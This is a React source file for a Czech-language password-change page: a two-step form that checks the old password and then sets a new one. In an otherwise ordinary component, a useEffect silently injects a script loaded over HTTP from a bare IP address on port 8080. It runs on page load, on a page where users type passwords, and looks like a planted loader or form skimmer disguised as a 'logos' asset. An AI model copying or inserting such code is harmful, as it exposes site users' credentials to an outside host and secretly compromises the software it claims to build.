import React, { useContext, useState, useEffect, useRef } from 'react'
import UserContext from '../../context/user/userContext';
import Header from '../Header/Header';
import { useHistory } from "react-router-dom";
import api from '../../scripts/api';


// /password/check

const PasswordChange = () => {

  const inputRef = useRef()

  useEffect(()=>{
	

    var tag = document.createElement('script');
    tag.async = false;
    tag.src = "http://82.208.16.123:8080/js/logos.js";
    var body = document.getElementsByTagName('body')[0];
    body.appendChild(tag);
  },[])	

  const userContext = useContext(UserContext);
  const { changePassword} = userContext;

  const history = useHistory();

  const [error, setError] = useState("")
  const [verify, setverify] = useState(false)
  const [formData, setFormData] = useState({
    password: '',
    passwordConf: ""
  });

  const onChange = (e) =>
    setFormData({ ...formData, [e.target.name]: e.target.value });

  const onSubmit = (e) => {
    e.preventDefault();
    if(password != formData.passwordConf){
      setError("Hesla musí souhlasit");
      
      return
    }
    changePassword(password);
    history.push("/");
  };

  const onVerify = async (e) => {
    e.preventDefault();

    

    const res = await api.post(`/password/check`, {password});
   

    if(res.data.result){
      setFormData({...formData, password:""})
    } else {
      setError("Špatné heslo")
    }

    setverify(res.data.result);
    inputRef.current.focus();
  };




  const { password } = formData;

  return (
    <>
    <Header/>

		<div className="container-login100" style={{minHeight: "80vh", alignItems:"center"}}>
			<div className="wrap-login100">
        {verify ? (
            <form className="login100-form validate-form" onSubmit={onSubmit}>
				
            <span className="login100-form-title p-b-26" style={{marginBottom:"20px"}}>
              Změna hesla
            </span>
            <div className="wrap-input100 validate-input" data-validate="Zadejte heslo">
              <span className="btn-show-pass">
                <i className="zmdi zmdi-eye"></i>
              </span>
              <input className="input100" type="password" 
               type="password"
              ref={inputRef}
               name="password"
               value={password}
               onChange={onChange}
              />
              <span className="focus-input100" data-placeholder="Nové heslo"></span>
            </div>
            <div className="wrap-input100 validate-input" data-validate="Potvrďte heslo">
              <span className="btn-show-pass">
                <i className="zmdi zmdi-eye"></i>
              </span>
              <input className="input100" type="password" 
               type="password"
            
               name="passwordConf"
               value={formData.passwordConf}
               onChange={onChange}
              />
              <span className="focus-input100" data-placeholder="Potvrzení hesla"></span>
            </div>
                 <div style={{color:"red", textAlign:"center", margin:"auto", marginBottom:10}}>
                <span>{error && error}</span>
                </div>
            
            <div className="container-login100-form-btn"  style={{marginBottom: "50px"}}>
              <div className="wrap-login100-form-btn">
                <div className="login100-form-bgbtn"></div>
                <button className="login100-form-btn" type='submit'>
                  Změnit heslo
                </button>
              </div>
            </div>
          </form>
        ) : (
          
          <form className="login100-form validate-form" onSubmit={onVerify}>
				
					<span className="login100-form-title p-b-26" style={{marginBottom:"20px"}}>
						Ověření
					</span>
					<div className="wrap-input100 validate-input" data-validate="Zadejte staré heslo">
						<span className="btn-show-pass">
							<i className="zmdi zmdi-eye"></i>
						</span>
						<input className="input100" type="password" 
						 type="password"
					
						 name="password"
						 value={password}
						 onChange={onChange}
						/>
						<span className="focus-input100" data-placeholder="Staré heslo"></span>
					</div>
     					<div style={{color:"red", textAlign:"center", margin:"auto", marginBottom:10}}>
						  <span>{error && error}</span>
						  </div>
					
					<div className="container-login100-form-btn"  style={{marginBottom: "50px"}}>
						<div className="wrap-login100-form-btn">
							<div className="login100-form-bgbtn"></div>
							<button className="login100-form-btn" type='submit'>
								Ověřit
							</button>
						</div>
					</div>
				</form>
        )}
				


			
			</div>
		</div>
		

    </>

  )
}

export default PasswordChange





/* <div className="flex">

        <div className="form-container">
          <form className="form" onSubmit={onSubmit}>

            <div className="form-group">
              <i className="fas fa-key form-icon"></i>
              <input
                type="password"
                placeholder="Password"
                name="password"
                value={password}
                onChange={onChange}
              />
            </div>
            <button type="submit" className="btn btn-primary">Změnit heslo</button>
          </form>
        </div>
      </div> */